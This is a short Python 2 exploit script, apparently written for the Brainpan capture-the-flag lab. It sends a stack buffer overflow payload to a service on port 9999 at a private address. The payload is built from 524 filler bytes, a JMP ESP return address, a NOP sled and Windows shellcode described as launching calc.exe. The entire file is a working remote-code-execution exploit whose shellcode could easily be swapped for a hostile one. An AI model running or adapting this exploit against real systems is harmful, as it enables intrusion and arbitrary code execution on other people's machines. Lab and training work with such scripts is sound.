#! /usr/bin/python
# Name: Rio Atmadja
import socket 
import sys 

# shellcode: windows/exec -> execute calc.exe
shellcode = ("\xdb\xdf\xd9\x74\x24\xf4\xb8\x9a\x59\x02\x8e\x5e\x31\xc9\xb1"
"\x33\x31\x46\x17\x83\xee\xfc\x03\xdc\x4a\xe0\x7b\x1c\x84\x6d"
"\x83\xdc\x55\x0e\x0d\x39\x64\x1c\x69\x4a\xd5\x90\xf9\x1e\xd6"
"\x5b\xaf\x8a\x6d\x29\x78\xbd\xc6\x84\x5e\xf0\xd7\x28\x5f\x5e"
"\x1b\x2a\x23\x9c\x48\x8c\x1a\x6f\x9d\xcd\x5b\x8d\x6e\x9f\x34"
"\xda\xdd\x30\x30\x9e\xdd\x31\x96\x95\x5e\x4a\x93\x69\x2a\xe0"
"\x9a\xb9\x83\x7f\xd4\x21\xaf\xd8\xc5\x50\x7c\x3b\x39\x1b\x09"
"\x88\xc9\x9a\xdb\xc0\x32\xad\x23\x8e\x0c\x02\xae\xce\x49\xa4"
"\x51\xa5\xa1\xd7\xec\xbe\x71\xaa\x2a\x4a\x64\x0c\xb8\xec\x4c"
"\xad\x6d\x6a\x06\xa1\xda\xf8\x40\xa5\xdd\x2d\xfb\xd1\x56\xd0"
"\x2c\x50\x2c\xf7\xe8\x39\xf6\x96\xa9\xe7\x59\xa6\xaa\x4f\x05"
"\x02\xa0\x7d\x52\x34\xeb\xeb\xa5\xb4\x91\x52\xa5\xc6\x99\xf4"
"\xce\xf7\x12\x9b\x89\x07\xf1\xd8\x66\x42\x58\x48\xef\x0b\x08"
"\xc9\x72\xac\xe6\x0d\x8b\x2f\x03\xed\x68\x2f\x66\xe8\x35\xf7"
"\x9a\x80\x26\x92\x9c\x37\x46\xb7\xfe\xd6\xd4\x5b\x2f\x7d\x5d"
"\xf9\x2f")

#jmp esp found at 0x7e429353
ret = "\x53\x93\x42\x7e"

#note: brainpan crashed after sending 700 bytes to the server
payload = '\x41' * 524 + ret + '\x90' * 16 + shellcode

#send evil payload to the target
print "Sending Evil buffer --> " + str(len(payload)) + " bytes"
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect.connect(("192.168.10.101",9999))

except:

	print "[-] Connection Error"
	response = connect.recv(2000)
	print response
	sys.exit(1)

connect.recv(2000)
connect.send(payload + ' ' + '\r\n')
connect.close()




